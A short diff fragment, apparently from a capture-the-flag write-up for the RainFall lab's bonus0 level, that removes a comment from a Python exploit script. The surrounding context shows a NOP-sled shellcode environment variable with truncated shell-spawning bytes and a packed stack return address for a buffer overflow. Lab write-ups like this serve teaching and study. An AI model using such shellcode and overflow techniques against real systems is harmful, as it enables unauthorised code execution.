@@ -118,8 +118,6 @@ export shellcode=$(python -c 'print "\x90"*400 + "\x6a\x0b\x58\x99\x52\x68\x2f\x
 ```
 bonus0@RainFall:~$ nano /var/tmp/exploit.py
 
-  #0xbffffdf0
-
   import struct
 
   shellcode = struct.pack("I", 0xbffffdf0)
